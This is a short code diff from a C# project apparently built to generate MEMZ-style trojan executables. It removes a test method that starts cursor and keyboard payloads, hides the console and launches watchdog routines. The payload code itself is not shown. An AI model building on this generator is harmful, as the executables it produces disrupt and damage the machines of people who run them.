@@ -78,15 +78,5 @@ namespace Glitch
             tb.CreateType();
             ab.Save(aName.Name + ".exe");
         }
-
-        public static void ILTest() // used for finding IL code using the IDE-integrated IL-Viewer
-        {
-            StandardCommands.ShowNotepad();
-            StandardCommands.GetRunner(StandardCommands.GetMethodInfo(Memz.PayloadCursor), 15000, 47).Start();
-            StandardCommands.GetRunner(StandardCommands.GetMethodInfo(Memz.PayloadKeyboard), 25, 35).Start();
-            StandardCommands.LaunchIncrementor();
-            StandardCommands.HideCmd();
-            StandardCommands.RunWDs();
-        }
     }
 }
